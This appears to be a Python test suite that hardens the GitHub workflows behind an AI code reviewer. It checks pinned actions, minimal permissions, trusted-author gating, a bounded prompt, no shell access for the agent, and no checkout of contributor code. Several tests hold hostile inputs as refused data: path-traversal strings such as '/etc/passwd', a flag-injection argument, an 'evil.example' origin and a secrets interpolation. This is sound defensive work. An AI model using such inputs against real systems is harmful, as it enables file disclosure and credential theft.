from __future__ import annotations

import base64
import http.server
import importlib.util
import json
import os
import pathlib
import re
import shutil
import subprocess  # nosec B404 -- test-only boundary; every argv below is literal
import tempfile
import threading
import unittest
import urllib.error
from pathlib import Path
from typing import Any

from tools.knowledge_common import load_yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github" / "workflows"
REVIEW_WORKFLOW = WORKFLOWS / "claude-code-review.yml"
MENTION_WORKFLOW = WORKFLOWS / "claude.yml"

_PINNED_USES = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@[0-9a-f]{40}$")
_TRUSTED_ASSOCIATIONS = ("OWNER", "MEMBER", "COLLABORATOR")
_ASSOCIATION_FIELDS = (
    "github.event.comment.author_association",
    "github.event.review.author_association",
    "github.event.issue.author_association",
)
# Decision 0094: agent mode fetches no GitHub data, so every context byte the
# reviewer receives is interpolated here. Only sources whose size is independent
# of the discussion length are admitted.
_BOUNDED_PROMPT_SOURCES = frozenset(
    {
        "github.repository",
        "github.event.issue.number",
        "github.event.pull_request.number",
        "github.event.pull_request.head.sha",
        "github.event.pull_request.base.sha",
        "github.event.pull_request.body",
        "github.event.comment.body",
        "github.event.issue.body",
        "github.event.review.body",
        "steps.review_head.outputs.base_sha",
        "steps.review_head.outputs.head_sha",
        "github.event.comment.path",
        "github.event.comment.line",
        "github.event.comment.diff_hunk",
        "github.event.comment.original_commit_id",
        "steps.review_head.outputs.pull_number",
        "github.event.comment.original_line",
        "github.event.issue.author_association",
        "github.event.pull_request.author_association",
        "github.event.issue.title",
    }
)
# Expressions may be compound (a trust check guarding a field), so the contract
# is on the identifiers they read, not on the expression text.
_PROMPT_EXPRESSION = re.compile(r"\$\{\{(.+?)\}\}", re.DOTALL)
# A parser that recognises only the contexts already in use is not a contract: a
# future `secrets.*` or `env.*` interpolation would contribute no identifier and
# leave the exhaustive-source test green. Every token an expression contains is
# therefore classified, and anything unrecognised fails the test.
_PROMPT_LITERAL = re.compile(r"'(?:[^']|'')*'")
_PROMPT_TOKEN = re.compile(r"[A-Za-z_][A-Za-z0-9_.]*")
_PROMPT_FUNCTIONS = frozenset(
    {
        "always",
        "cancelled",
        "contains",
        "endsWith",
        "failure",
        "format",
        "fromJSON",
        "hashFiles",
        "join",
        "startsWith",
        "success",
        "toJSON",
    }
)
_PROMPT_KEYWORDS = frozenset({"false", "null", "true"})
_MAX_STATIC_PROMPT_BYTES = 4096
CHUNKER = ROOT / ".github" / "review-context" / "chunk_diff.py"
BASE_COLLECTOR = ROOT / ".github" / "review-context" / "build_review_context.py"
PUBLISHER = ROOT / ".github" / "review-context" / "publish_report.py"


def _load_script(path: pathlib.Path) -> Any:
    """Import a committed review-context script by path."""
    spec = importlib.util.spec_from_file_location(path.stem, path)
    if spec is None:
        raise AssertionError(f"no import spec for {path}")
    if spec.loader is None:
        raise AssertionError(f"no loader for {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


# Resolved absolutely so the behavioural test never depends on PATH order. Only sh
# is needed now: the collection step is executed against a stubbed provider rather
# than against a local repository.
_SH = shutil.which("sh")


def _workflow_paths(directory: Path) -> list[Path]:
    # GitHub Actions loads both extensions from .github/workflows.
    return sorted(
        path for pattern in ("*.yml", "*.yaml") for path in directory.glob(pattern)
    )


def _steps(workflow: dict[str, Any]) -> list[dict[str, Any]]:
    return [step for job in workflow["jobs"].values() for step in job.get("steps", [])]


def _action_references(workflow: dict[str, Any]) -> list[str]:
    references = [job["uses"] for job in workflow["jobs"].values() if "uses" in job]
    references.extend(step["uses"] for step in _steps(workflow) if "uses" in step)
    return references


def _outside_expressions(prompt: str) -> str:
    """Return the prompt with every ${{ ... }} expression removed."""

    return _PROMPT_EXPRESSION.sub("", prompt)


def _prompt_contexts(prompt: str) -> set[str]:
    """Return every context an interpolation reads, classifying all tokens."""
    contexts: set[str] = set()
    for match in _PROMPT_EXPRESSION.finditer(prompt):
        body = _PROMPT_LITERAL.sub(" ", match.group(1))
        for token in _PROMPT_TOKEN.findall(body):
            if token in _PROMPT_FUNCTIONS or token in _PROMPT_KEYWORDS:
                continue
            contexts.add(token)
    return contexts


def _file(
    name: str,
    status: str,
    *,
    previous: str | None = None,
    patch: str | None = "@@",
) -> dict[str, Any]:
    """Return one comparison file entry with the fields the collector reads."""
    entry: dict[str, Any] = {
        "filename": name,
        "status": status,
        "additions": 1,
        "deletions": 1,
        "sha": "f" * 40,
        "patch": patch,
    }
    if previous is not None:
        entry["previous_filename"] = previous
    return entry


def _comparison(
    context: pathlib.Path, merge_base: str, files: list[dict[str, Any]]
) -> None:
    """Write the comparison payload the collector reads."""
    (context / "comparison.json").write_text(
        json.dumps({"merge_base_commit": {"sha": merge_base}, "files": files}),
        encoding="utf-8",
    )


def _provider(
    asked: list[str],
    *,
    listings: dict[str, Any],
    contents: dict[str, Any],
) -> Any:
    """Answer provider URLs by their path, recording each one asked for."""

    def answer(url: str) -> Any:
        asked.append(url)
        path = url.split("/contents/", 1)[1].split("?", 1)[0]
        if path in listings:
            return listings[path]
        return contents.get(path)

    return answer


def _payload(content: bytes) -> dict[str, Any]:
    """Return a contents response for an ordinary base64 file."""
    return {
        "type": "file",
        "encoding": "base64",
        "content": base64.b64encode(content).decode(),
    }


def _checkouts(workflow: dict[str, Any]) -> list[dict[str, Any]]:
    """Return the checkout steps, in the order the job runs them."""
    return [
        step
        for step in _steps(workflow)
        if str(step.get("uses", "")).startswith("actions/checkout@")
    ]


def _base_checkout(workflow: dict[str, Any]) -> dict[str, Any]:
    """Return the single checkout the mention job performs."""
    checkouts = _checkouts(workflow)
    if len(checkouts) != 1:
        raise AssertionError(f"expected exactly one checkout, found {len(checkouts)}")
    return checkouts[0]


def _named_step(workflow: dict[str, Any], name: str) -> dict[str, Any]:
    """Return the mention job's step with this exact name."""
    for job in workflow["jobs"].values():
        for step in job.get("steps", []):
            if str(step.get("name", "")) == name:
                return step
    raise AssertionError(f"no step named {name!r}")


def _context_step(workflow: dict[str, Any]) -> dict[str, Any]:
    """Return the step that retrieves review context on the reviewer's behalf."""
    for job in workflow["jobs"].values():
        for step in job.get("steps", []):
            if str(step.get("name", "")) == "Collect review context":
                return step
    raise AssertionError("no step collects review context")


def _claude_step(workflow: dict[str, Any]) -> dict[str, Any]:
    return next(
        step
        for step in _steps(workflow)
        if step.get("uses", "").startswith("anthropics/claude-code-action@")
    )


def _single_job(workflow: dict[str, Any]) -> dict[str, Any]:
    jobs = list(workflow["jobs"].values())
    if len(jobs) != 1:
        raise AssertionError(f"expected exactly one job, found {len(jobs)}")
    return jobs[0]


class WorkflowEnumerationTests(unittest.TestCase):
    def test_workflow_paths_cover_both_github_extensions(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            for name in ("a.yml", "b.yaml", "c.json"):
                (root / name).write_text("", encoding="utf-8")
            self.assertEqual(
                ["a.yml", "b.yaml"],
                [path.name for path in _workflow_paths(root)],
            )

    def test_action_references_include_reusable_workflow_jobs(self) -> None:
        workflow = {
            "jobs": {
                "call": {"uses": "owner/repo/.github/workflows/x.yml@main"},
                "run": {"steps": [{"uses": "owner/action@v1"}, {"run": "true"}]},
            }
        }
        self.assertEqual(
            ["owner/repo/.github/workflows/x.yml@main", "owner/action@v1"],
            _action_references(workflow),
        )


class ClaudeActionsWorkflowTests(unittest.TestCase):
    def test_every_workflow_action_is_pinned_to_a_full_commit_sha(self) -> None:
        for path in _workflow_paths(WORKFLOWS):
            for uses in _action_references(load_yaml(path)):
                if uses.startswith("./"):
                    continue
                with self.subTest(workflow=path.name, uses=uses):
                    self.assertRegex(uses, _PINNED_USES)

    def test_claude_checkouts_do_not_persist_credentials(self) -> None:
        for path in (REVIEW_WORKFLOW, MENTION_WORKFLOW):
            checkouts = [
                step
                for step in _steps(load_yaml(path))
                if step.get("uses", "").startswith("actions/checkout@")
            ]
            self.assertTrue(checkouts, path.name)
            for step in checkouts:
                with self.subTest(workflow=path.name, step=step.get("name")):
                    self.assertIs(
                        False, step.get("with", {}).get("persist-credentials")
                    )

    def test_claude_workflows_keep_minimal_token_permissions(self) -> None:
        expected = {
            REVIEW_WORKFLOW: {
                "contents": "read",
                "pull-requests": "read",
                "issues": "read",
                "id-token": "write",
            },
            MENTION_WORKFLOW: {
                "contents": "read",
                "pull-requests": "read",
                "issues": "read",
                "id-token": "write",
                "actions": "read",
            },
        }
        for path, permissions in expected.items():
            with self.subTest(workflow=path.name):
                workflow = load_yaml(path)
                self.assertNotIn("permissions", workflow)
                self.assertEqual(_single_job(workflow)["permissions"], permissions)

    def test_review_job_skips_forks_and_drafts_and_cancels_stale_runs(self) -> None:
        workflow = load_yaml(REVIEW_WORKFLOW)
        job = _single_job(workflow)
        condition = " ".join(job["if"].split())
        self.assertIn(
            "github.event.pull_request.head.repo.full_name == github.repository",
            condition,
        )
        self.assertIn("!github.event.pull_request.draft", condition)
        self.assertEqual(
            {
                "group": "claude-code-review-${{ github.event.pull_request.number }}",
                "cancel-in-progress": True,
            },
            workflow["concurrency"],
        )
        self.assertIsInstance(job.get("timeout-minutes"), int)

    def test_review_plugin_marketplace_is_a_pinned_local_checkout(self) -> None:
        steps = _steps(load_yaml(REVIEW_WORKFLOW))
        marketplace_checkouts = [
            step
            for step in steps
            if step.get("uses", "").startswith("actions/checkout@")
            and step.get("with", {}).get("repository") == "anthropics/claude-code"
        ]
        self.assertEqual(1, len(marketplace_checkouts))
        checkout = marketplace_checkouts[0]["with"]
        self.assertRegex(str(checkout.get("ref")), r"^[0-9a-f]{40}$")
        claude = next(
            step
            for step in steps
            if step.get("uses", "").startswith("anthropics/claude-code-action@")
        )
        marketplace = claude["with"]["plugin_marketplaces"]
        self.assertNotIn("://", marketplace)
        self.assertEqual(
            "${{ github.workspace }}/" + checkout["path"], marketplace.strip()
        )

    def test_mention_job_requires_trusted_author_association(self) -> None:
        workflow = load_yaml(MENTION_WORKFLOW)
        job = _single_job(workflow)
        condition = " ".join(job["if"].split())
        for field in _ASSOCIATION_FIELDS:
            with self.subTest(field=field):
                self.assertIn(field, condition)
        for association in _TRUSTED_ASSOCIATIONS:
            self.assertIn(association, condition)
        self.assertIsInstance(job.get("timeout-minutes"), int)
        # A shared group would let an unrelated comment replace a pending request.
        self.assertNotIn("concurrency", workflow)
        self.assertNotIn("concurrency", job)

    def test_mention_job_runs_in_bounded_agent_mode(self) -> None:
        # src/modes/detector.ts selects agent mode when a prompt input is present,
        # including on comment events; src/modes/agent/index.ts then fetches no
        # GitHub data. Tag mode instead retrieves every comment and review with no
        # cap, which is what exhausted the request on a large Pull Request.
        workflow = load_yaml(MENTION_WORKFLOW)
        claude = _claude_step(workflow)
        prompt = claude["with"].get("prompt")
        self.assertIsInstance(
            prompt, str, "mention job must supply a prompt to select agent mode"
        )
        self.assertTrue(prompt.strip())

    def test_mention_prompt_interpolates_only_bounded_sources(self) -> None:
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        unbounded = _prompt_contexts(prompt) - _BOUNDED_PROMPT_SOURCES
        self.assertEqual(
            set(),
            unbounded,
            "prompt interpolates sources whose size grows with the discussion",
        )
        # Positive controls: the contexts an earlier parser silently dropped must
        # now be surfaced, so this test cannot stay green through a blind spot.
        for injected in (
            "${{ secrets.ANTHROPIC_API_KEY }}",
            "${{ env.SOME_VALUE }}",
            "${{ vars.SOME_VALUE }}",
            "${{ needs.build.outputs.blob }}",
            "${{ mystery }}",
        ):
            with self.subTest(injected=injected):
                self.assertTrue(
                    _prompt_contexts(injected) - _BOUNDED_PROMPT_SOURCES,
                    f"{injected} was not classified as an unadmitted source",
                )

    def test_mention_prompt_carries_the_triggering_request(self) -> None:
        # Agent mode ignores the comment body unless the template forwards it,
        # so an unforwarded mention would silently review nothing.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        self.assertIn("github.event.comment.body", prompt)

    def test_mention_prompt_is_statically_bounded(self) -> None:
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        self.assertLessEqual(len(prompt.encode("utf-8")), _MAX_STATIC_PROMPT_BYTES)

    def test_mention_job_replaces_the_tag_mode_tracking_comment(self) -> None:
        # Agent mode sets claudeCommentId to undefined, so results need an explicit
        # delivery path rather than the tag-mode tracking comment. That path is the
        # repository's own publishing step, not the action's report: this test used to
        # require display_report to be true, which is the setting the action documents
        # as safe only for trusted input.
        workflow = load_yaml(MENTION_WORKFLOW)
        self.assertEqual(
            "false", str(_claude_step(workflow)["with"]["display_report"]).lower()
        )
        publish = _named_step(workflow, "Publish the review report")
        self.assertIn("GITHUB_STEP_SUMMARY", str(publish["run"]))

    def test_mention_checkout_binds_the_reviewed_pull_request_head(self) -> None:
        # Agent mode does no PR resolution of its own. On a comment event the
        # default checkout lands on the default branch, so an unbound ref would
        # make the reviewer diff main against itself and report nothing.
        workflow = load_yaml(MENTION_WORKFLOW)
        checkout = _base_checkout(workflow)
        ref = " ".join(str(checkout["with"]["ref"]).split())
        # Superseded three times. The head is resolved with the read-only token
        # rather than taken from the event payload; the head is no longer checked out
        # at all, because the change reaches the reviewer as trusted artefacts; and
        # the checkout is bound to the protected default branch rather than to a step
        # output. What must still hold is that it is never left to follow github.ref,
        # which on the review triggers is the candidate's merge ref.
        self.assertNotIn("github.ref", ref)
        self.assertEqual("${{ github.workflow_sha }}", ref)
        resolve = next(
            step for step in _steps(workflow) if step.get("id") == "review_head"
        )
        run = str(resolve["run"])
        self.assertIn("PULL_NUMBER", run)
        self.assertIn("GITHUB_OUTPUT", run)
        # The resolved head is still what the change is described against.
        self.assertIn("HEAD_SHA", str(_context_step(workflow)["env"]))

    def test_mention_prompt_covers_every_admitted_trigger_payload(self) -> None:
        # issue_comment carries github.event.issue.*; the review triggers carry
        # github.event.pull_request.*; issues:opened may put the mention in the
        # title alone. A template that reads only one shape silently loses the
        # other two.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        for expression in (
            "github.event.issue.number",
            "github.event.pull_request.number",
            "github.event.issue.body",
            "github.event.pull_request.body",
            "github.event.issue.title",
        ):
            with self.subTest(expression=expression):
                self.assertIn(expression, prompt)

    def test_mention_job_never_checks_out_a_fork_controlled_head(self) -> None:
        # Binding the checkout to a Pull Request head puts contributor-controlled
        # code in the job that holds the Claude credential. Decision 0093 rule 5
        # already restricts the automatic review to same-repository heads; the
        # mention job must reach the same boundary, and its author-association
        # gate does not, because it constrains who comments rather than whose code
        # is checked out.
        workflow = load_yaml(MENTION_WORKFLOW)
        text = MENTION_WORKFLOW.read_text(encoding="utf-8")
        self.assertIn("github.repository", text)
        guard = [
            step
            for step in _steps(workflow)
            if "full_name" in str(step.get("run", "")) + str(step.get("if", ""))
        ]
        self.assertTrue(
            guard, "mention job needs an explicit same-repository head guard"
        )
        ref = str(_base_checkout(workflow)["with"]["ref"]).strip()
        # Nothing contributor-controlled may reach the checkout. The only tree
        # materialised is the protected default branch, so no fork head, merge ref or
        # payload-supplied SHA can be it; the guard still governs which head the
        # comparison is asked for.
        self.assertEqual("${{ github.workflow_sha }}", ref)
        for forbidden in ("refs/pull/", "head.sha", "head_sha", "github.ref"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, ref)
        collect = _context_step(workflow)
        self.assertIn(
            "steps.review_head.outputs.head_sha", str(collect["env"]["HEAD_SHA"])
        )

    def test_mention_prompt_names_the_declared_entry_route(self) -> None:
        # AGENTS.md itself begins "Start with README.md"; sending the reviewer
        # somewhere else skips the router the repository declares.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        self.assertIn("README.md", prompt)

    def test_mention_prompt_names_the_collected_context(self) -> None:
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = " ".join(_claude_step(workflow)["with"]["prompt"].split())
        # The directory is named once and the artefacts are listed under it.
        self.assertIn(".gnostoa-review-context/", prompt)
        for artefact in (
            "diff.stat",
            "commits.log",
            "diff.patch",
            "patches/",
            "no-patch.txt",
            "base/",
            "base.manifest",
        ):
            with self.subTest(artefact=artefact):
                self.assertIn(artefact, prompt)

    def test_mention_prompt_diffs_against_the_resolved_base(self) -> None:
        # A hardcoded branch is wrong for any Pull Request that does not target it.
        workflow = load_yaml(MENTION_WORKFLOW)
        prompt = _claude_step(workflow)["with"]["prompt"]
        self.assertIn("steps.review_head.outputs.base_sha", prompt)
        self.assertNotIn("origin/main", prompt)

    def test_mention_job_grants_no_shell_at_all(self) -> None:
        # An argument allowlist cannot constrain a shell. A granted Bash command is
        # run through one, so redirection, pipes and substitution stay available
        # whatever the invoked program validates. Retrieval therefore happens in a
        # trusted step and the reviewer gets no Bash of any shape.
        workflow = load_yaml(MENTION_WORKFLOW)
        args = str(_claude_step(workflow)["with"].get("claude_args", ""))
        self.assertIn("--allowedTools", args)
        self.assertNotIn("Bash", args)

    def test_no_candidate_tree_is_materialised(self) -> None:
        # CodeQL flags the shape, not its placement: a credential-bearing workflow
        # that materialises a contributor-controlled tree. Hardening inside that
        # shape cannot remove it, so the shape is gone -- only the base is checked
        # out, and the change arrives as artefacts built from the provider's
        # comparison. No candidate file, mode or symlink reaches this filesystem.
        workflow = load_yaml(MENTION_WORKFLOW)
        base = _base_checkout(workflow)
        # Bound to the protected default branch, by a repository property rather
        # than by a step output or anything a trigger carries.
        self.assertEqual("${{ github.workflow_sha }}", str(base["with"]["ref"]).strip())
        self.assertNotIn("path", base.get("with", {}))
        text = MENTION_WORKFLOW.read_text(encoding="utf-8")
        # The head may still be named in the prompt and in the collection step; what
        # must not happen is a checkout of it.
        for checkout in _checkouts(workflow):
            with self.subTest(checkout=str(checkout.get("name", ""))):
                self.assertNotIn("outputs.head_sha", str(checkout.get("with", "")))
        args = str(_claude_step(workflow)["with"].get("claude_args", ""))
        self.assertNotIn("--add-dir", args)
        # No local materialisation of the head by any other means either.
        for forbidden in ("git archive", "git fetch", "git checkout", "git worktree"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, text)

    def test_context_is_built_from_the_provider_comparison(self) -> None:
        # The two revisions must come from the trusted resolver, never the payload,
        # and the retrieval must not reach a candidate working tree.
        step = _context_step(load_yaml(MENTION_WORKFLOW))
        script = str(step["run"])
        self.assertIn("compare/${BASE_SHA}...${HEAD_SHA}", script)
        self.assertIn("application/vnd.github.v3.diff", script)
        self.assertNotIn("working-directory", step)
        env = {key: str(value) for key, value in step["env"].items()}
        self.assertIn("github.token", env["GH_TOKEN"])
        for value in env.values():
            with self.subTest(value=value):
                self.assertNotIn("github.event.", value)

    def test_reviewed_commit_is_gated_on_the_submitted_review_event(self) -> None:
        # A pull_request_review_comment payload can also carry a review object, and
        # selecting it there would drop the later commits of a multi-commit Pull
        # Request. Presence is not the right condition; the event name is.
        workflow = load_yaml(MENTION_WORKFLOW)
        resolve = _named_step(workflow, "Resolve trusted review head")
        reviewed = " ".join(str(resolve["env"]["REVIEWED_COMMIT"]).split())
        self.assertIn("github.event_name == 'pull_request_review'", reviewed)
        self.assertIn("github.event.review.commit_id", reviewed)

    def test_change_status_is_not_abbreviated_to_one_letter(self) -> None:
        # "removed" and "renamed" share a first letter, so an abbreviated status
        # would make a deletion indistinguishable from a rename in diff.stat.
        # The summary moved into the committed script, so that is where the
        # contract lives now.
        source = BASE_COLLECTOR.read_text(encoding="utf-8")
        self.assertIn("entry['status']", source)
        self.assertNotIn("[0:1]", source)

    def test_a_capped_commit_list_says_so(self) -> None:
        # The provider caps the commits it returns; a short list must not read as a
        # complete one.
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        self.assertIn("total_commits", script)

    def test_diff_parts_use_the_encoding_aware_chunker(self) -> None:
        # The reviewer reads the parts as text. `split -C` still cuts an oversized
        # single line by bytes, which halves a multibyte character.
        script = str(_context_step(load_yaml(MENTION_WORKFLOW))["run"])
        self.assertIn("chunk_diff.py", script)
        for forbidden in ("split -C", "split -b", "head -c"):
            with self.subTest(forbidden=forbidden):
                self.assertNotIn(forbidden, script)
        self.assertTrue(CHUNKER.is_file(), CHUNKER)

    def test_chunker_never_splits_a_character_or_loses_a_byte(self) -> None:
        # The oversized-line case is the one `split -C` gets wrong, so it is the one
        # exercised: a run of ASCII that ends one byte before the bound, followed by a
        # two-byte character straddling it.
        chunker = _load_script(CHUNKER)
        limit = 64
        oversized = b"a" * (limit - 1) + "é".encode() + b"b" * limit + b"\n"
        cases = {
            "oversized single line": oversized,
            "many short lines": b"".join(b"line %d\n" % n for n in range(200)),
            "exactly at the bound": b"x" * limit,
            "one byte over": b"x" * (limit + 1),
        }
        for name, payload in cases.items():
            with self.subTest(case=name), tempfile.TemporaryDirectory() as scratch:
                context = pathlib.Path(scratch)
                (context / "diff.full").write_bytes(payload)
                written = chunker.split_diff(context, limit)
                parts = sorted((context / "patches").glob("part-*"))
                self.assertEqual(len(parts), written)
                # Nothing lost, nothing reordered.
                self.assertEqual(payload, b"".join(p.read_bytes() for p in parts))
                for part in parts:
                    self.assertLessEqual(len(part.read_bytes()), limit)
                    # Every part must stand alone as text.
                    part.read_bytes().decode("utf-8")

    def test_base_collector_refuses_paths_that_could_escape(self) -> None:
        # Provider-supplied names are data. A path that should not occur is a reason
        # to stop, not something to sanitise into a guess.
        collector = _load_script(BASE_COLLECTOR)
        for refused in (
            "/etc/passwd",
            "../outside",
            "a/../../outside",
            "",
            "a//b",
            ".",
        ):
            with self.subTest(refused=refused):
                with self.assertRaises(ValueError):
                    collector.safe_relative_path(refused)
        self.assertEqual("src/app.py", str(collector.safe_relative_path("src/app.py")))

    def test_base_endpoint_is_built_from_validated_values(self) -> None:
        # The comparison's own contents_url is provider-supplied data reaching a
        # subprocess argument, and an endpoint beginning with a dash would be read as
        # a flag. The endpoint is therefore constructed and every part validated.
        collector = _load_script(BASE_COLLECTOR)
        self.assertEqual(
            "https://api.github.com/repos/o/r/contents/src/a%20b.py?ref=" + "b" * 40,
            collector.base_endpoint("o/r", "src/a b.py", "b" * 40),
        )
        for repository, path, sha in (
            ("-o/r", "a.py", "b" * 40),
            ("o/-r", "a.py", "b" * 40),
            ("o", "a.py", "b" * 40),
            ("o/r", "a.py", "short"),
            ("o/r", "a.py", "B" * 40),
            ("o/r", "/etc/passwd", "b" * 40),
            ("o/r", "../outside", "b" * 40),
        ):
            with self.subTest(repository=repository, path=path, sha=sha):
                with self.assertRaises(ValueError):
                    collector.base_endpoint(repository, path, sha)

    def test_provider_endpoint_is_validated_at_the_point_of_use(self) -> None:
        # Validating where the endpoint is built is not enough: the argument reaching
        # the subprocess is what matters, so the sink checks it too.
        collector = _load_script(BASE_COLLECTOR)
        good = collector.base_endpoint("o/r", "src/a b.py", "b" * 40)
        self.assertRegex(good, collector._URL)
        for refused in (
            "--version",
            "repos/o/r/contents/a.py?ref=" + "b" * 40,
            "https://api.github.com/repos/o/r/contents/a.py?ref=short",
            "https://api.github.com/repos/-o/r/contents/a.py?ref=" + "b" * 40,
            "https://api.github.com/repos/o/r/contents/a.py?ref=" + "B" * 40,
            # Another origin must not be representable at all.
            "https://evil.example/repos/o/r/contents/a.py?ref=" + "b" * 40,
            "http://api.github.com/repos/o/r/contents/a.py?ref=" + "b" * 40,
        ):
            with self.subTest(refused=refused):
                self.assertNotRegex(refused, collector._URL)
                with self.assertRaises(ValueError):
                    collector._provider_json(refused)

    def test_base_collector_writes_what_it_can_and_names_what_it_cannot(self) -> None:
        # Every branch that would otherwise hand the reviewer something false rather
        # than something missing.
        collector = _load_script(BASE_COLLECTOR)
        merge_base = "d" * 40
        asked: list[str] = []
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(
                context,
                merge_base,
                [
                    _file("src/kept.py", "modified"),
                    _file("new.py", "renamed", previous="old.py"),
                    _file("fresh.py", "added"),
                    _file("link", "modified"),
                    _file("huge.py", "modified"),
                    _file("asset.png", "added", patch=None),
                ],
            )
            collector._provider_json = _provider(
                asked,
                listings={
                    "": [
                        {"name": "new.py", "type": "file"},
                        {"name": "old.py", "type": "file"},
                        {"name": "fresh.py", "type": "file"},
                        # The listing is the only authoritative statement of type.
                        {"name": "link", "type": "symlink"},
                        {"name": "huge.py", "type": "file"},
                        {"name": "asset.png", "type": "file"},
                    ],
                    "src": [{"name": "kept.py", "type": "file"}],
                },
                contents={
                    "src/kept.py": _payload(b"before\n"),
                    # The base holds a renamed file under its previous path only.
                    "old.py": _payload(b"old body\n"),
                    # A resolved symlink is shaped exactly like an ordinary file, so
                    # this response would be accepted if the listing were not checked.
                    "link": _payload(b"resolved target\n"),
                    # Files around a megabyte come back with no usable content.
                    "huge.py": {"type": "file", "encoding": "none", "content": ""},
                },
            )
            written, unavailable = collector.collect(context, "o/r", 4096)

            self.assertEqual(2, written)
            self.assertEqual(
                "before\n",
                (context / "base" / "src" / "kept.py").read_text(encoding="utf-8"),
            )
            # Fetched under the old path, written under the new one.
            self.assertEqual(
                "old body\n", (context / "base" / "new.py").read_text(encoding="utf-8")
            )
            self.assertFalse((context / "base" / "old.py").exists())
            self.assertTrue(
                any(f"contents/old.py?ref={merge_base}" in url for url in asked), asked
            )

            self.assertIn("added-by-candidate fresh.py", unavailable)
            self.assertIn("not-a-plain-file link", unavailable)
            self.assertIn("not-a-plain-file huge.py", unavailable)
            self.assertFalse((context / "base" / "link").exists())
            # Refused from the listing, before its content was ever requested. The
            # previous version of this test fabricated a `type: symlink` contents
            # response, which the provider does not send for a symlink to a file, so
            # it confirmed the check rather than exercising it.
            self.assertFalse(
                any(f"contents/link?ref={merge_base}" in url for url in asked), asked
            )
            # A hunkless entry is now accounted for rather than skipped in silence:
            # this one is an addition, so the base genuinely has nothing for it.
            self.assertIn("added-by-candidate asset.png", unavailable)

            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn(merge_base, manifest)
            for line in unavailable:
                with self.subTest(line=line):
                    self.assertIn(line, manifest)

            # Per-file hunks are assembled whether or not the unified diff arrives, so
            # a refused diff still leaves the changed content reachable.
            assembled = (context / "assembled.diff").read_text(encoding="utf-8")
            self.assertIn("+++ b/src/kept.py", assembled)
            # A file with no hunks stays in the fallback as a header recording the
            # change. Dropping it -- which this assertion previously required --
            # removed a reviewable metadata-only change from the only artefact that
            # carries the diff when the provider refuses the unified one.
            self.assertIn("+++ b/asset.png", assembled)
            self.assertIn("[no hunks: added", assembled)
            # A rename's old path must survive every retained artefact: without it the
            # reviewer cannot say where the file came from, which is exactly what the
            # swap and overwrite cases turn on.
            self.assertIn("--- a/old.py\n+++ b/new.py", assembled)
            self.assertRegex(
                (context / "diff.stat").read_text(encoding="utf-8"),
                r"renamed \S+ \S+ old\.py -> new\.py",
            )
            self.assertIn("renamed old.py -> new.py", manifest)

    def test_a_truncated_listing_is_not_reported_as_absence(self) -> None:
        # The contents API caps a directory listing and does not paginate it, so a
        # changed file in a larger directory is simply missing from the response.
        # Calling that "absent at the merge base" would be the false base-state claim
        # this collection exists to avoid.
        collector = _load_script(BASE_COLLECTOR)
        crowd = [
            {"name": f"other{index}.py", "type": "file"}
            for index in range(collector._LISTING_CAP)
        ]
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("vendor/late.py", "modified")])
            collector._provider_json = _provider(
                [], listings={"vendor": crowd}, contents={}
            )
            written, unavailable = collector.collect(context, "o/r", 4096)
            self.assertEqual(0, written)
            self.assertEqual(["listing-truncated vendor/late.py"], unavailable)

        # A short listing that genuinely lacks the name still reports absence.
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(context, "d" * 40, [_file("vendor/late.py", "modified")])
            collector._provider_json = _provider(
                [],
                listings={"vendor": [{"name": "other.py", "type": "file"}]},
                contents={},
            )
            _, unavailable = collector.collect(context, "o/r", 4096)
            self.assertEqual(["absent-at-merge-base vendor/late.py"], unavailable)

    def test_a_change_without_hunks_still_gets_its_pre_change_bytes(self) -> None:
        # A mode change or a pure rename of a text file has no hunks but does have
        # pre-change bytes, and those bytes are what the prompt sends the reviewer to
        # base/ for. Skipping such entries left the reviewer with no content and no gap
        # recorded for a change it had just been told was reviewable.
        collector = _load_script(BASE_COLLECTOR)
        with tempfile.TemporaryDirectory() as scratch:
            context = pathlib.Path(scratch)
            _comparison(
                context,
                "d" * 40,
                [
                    _file("text.py", "modified"),
                    _file("moved.py", "renamed", previous="was.py", patch=None),
                    _file("exe.sh", "modified", patch=None),
                ],
            )
            collector._provider_json = _provider(
                [],
                listings={
                    "": [
                        {"name": "text.py", "type": "file"},
                        {"name": "was.py", "type": "file"},
                        {"name": "exe.sh", "type": "file"},
                    ]
                },
                contents={
                    "text.py": _payload(b"text body\n"),
                    "was.py": _payload(b"renamed body\n"),
                    "exe.sh": _payload(b"script body\n"),
                },
            )
            written, unavailable = collector.collect(context, "o/r", 4096)
            self.assertEqual(3, written)
            self.assertEqual([], unavailable)
            # The rename's bytes come from the old path and land under the new one.
            self.assertEqual(
                "renamed body\n",
                (context / "base" / "moved.py").read_text(encoding="utf-8"),
            )
            self.assertEqual(
                "script body\n",
                (context / "base" / "exe.sh").read_text(encoding="utf-8"),
            )
            manifest = (context / "base.manifest").read_text(encoding="utf-8")
            self.assertIn("Written: 3", manifest)
            self.assertIn("renamed was.py -> moved.py", manifest)

    def test_a_hunkless_change_is_classified_by_blob_identity(self) -> None:
        # `status` is "modified" for both a mode-only change and a binary content
        # change, so it cannot distinguish them. Claiming it could would let the
        # reviewer call a binary change examined without seeing what changed.
        collector = _load_script(BASE_COLLECTOR)
        same = "1" * 40
